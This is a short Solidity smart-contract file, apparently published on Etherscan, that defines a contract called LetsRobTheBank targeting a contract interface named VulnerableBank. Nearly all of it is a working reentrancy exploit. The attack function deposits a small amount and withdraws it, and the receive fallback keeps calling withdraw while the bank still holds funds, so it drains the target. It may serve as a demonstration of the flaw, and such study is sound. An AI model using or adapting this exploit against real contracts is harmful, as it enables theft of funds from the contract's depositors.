/**
 *Submitted for verification at Etherscan.io on 2021-12-14
*/

pragma solidity ^0.8.0;

interface VulnerableBank {
    function deposit() external payable;
    function withdraw() external payable;
    function banksBalance() external view returns (uint256);
    function userBalance(address _address) external view returns (uint256);
}

contract LetsRobTheBank {
    
    VulnerableBank bank;
    mapping (address=>uint256) deposits;
    
    constructor (address _target) {
        bank = VulnerableBank(_target);
    }
   
    function attack () public payable {
        bank.deposit{value:1 gwei}();
        bank.withdraw();
    }

    function deposit1() public payable {
        deposits[msg.sender] += msg.value;
    }

    function attackerBalance () public view returns (uint256){
        return address(this).balance;
    }
   
    receive () external payable {
        if(bank.banksBalance()>0 gwei){
            bank.withdraw();
        } 
    } 
}